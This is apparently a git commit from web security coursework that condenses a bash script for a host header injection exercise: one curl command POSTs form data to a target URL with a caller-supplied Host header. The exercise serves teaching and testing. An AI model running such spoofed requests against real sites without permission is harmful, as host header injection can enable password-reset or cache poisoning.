1bfb7c85ce774a2631495c157309773f2e63e16b
wwalid18 <agar.io.annonyms@gmail.com>
2025-10-03 13:11:10 +0100

    task 1

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,13 +1,2 @@
 #!/usr/bin/env bash
-set -euo pipefail
-
-if [ "$#" -ne 3 ]; then
-  echo "Usage: $0 NEW_HOST TARGET_URL FORM_DATA" >&2
-  exit 2
-fi
-
-NEW_HOST=$1
-TARGET_URL=$2
-FORM_DATA=$3
-
-curl -sS -X POST "$TARGET_URL" -H "Host: $NEW_HOST" -H "Content-Type: application/x-www-form-urlencoded" --data "$FORM_DATA"
+curl -sS -X POST "$2" -H "Host: $1" -H "Content-Type: application/x-www-form-urlencoded" --data "$3"
